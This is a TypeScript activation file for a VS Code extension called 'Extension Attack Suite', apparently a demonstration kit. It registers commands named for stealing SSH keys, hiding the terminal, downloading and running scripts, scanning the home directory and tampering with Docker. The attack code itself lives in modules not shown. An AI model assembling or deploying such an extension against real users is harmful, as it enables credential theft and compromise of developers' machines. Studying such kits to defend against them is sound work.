import * as vscode from 'vscode';
import func_steal_ssh from './func_steal_ssh';
import func_macaddress from './func_macaddress';
import func_hide_terminal from './func_hide_terminal';
import func_download_script from './func_download_script';
import func_scan_homedir from './func_scan_homedir';
import func_web_request from './func_web_request';
import func_execute_script from './func_execute_script';
import func_tamper_docker from './func_tamper_docker';
const fs = require('fs');
const os = require('os');

export function activate(context: vscode.ExtensionContext) {
	
	console.log('Congratulations, your Extension Attack Suite is now active!');

	const commands: Map<string,()=>void> = new Map([
		['func.steal_ssh', func_steal_ssh],
		['func.macaddress', func_macaddress],
		['func.hide_terminal', func_hide_terminal],
		['func.download_script', func_download_script],
		['func.scan_homedir', func_scan_homedir],
		['func.web_request', func_web_request],
		['func.execute_script', func_execute_script],
		['func.tamper_docker', func_tamper_docker],
	]);

	vscode.window.showInformationMessage('Hello World from Extension Attack Suite!');

	for(let [key,cmd] of commands) {
		let disposable = vscode.commands.registerCommand(key, () => cmd());
		context.subscriptions.push(disposable);
		console.log(`Registered ${key}`);
	}
	
	let exampleAPI = {
		sum(x: number, y: number) {
			return x + y;
		},
		mul(x: number, y: number) {
			return x * y;
		}
	};
	
	return exampleAPI;
}

export function deactivate() {}
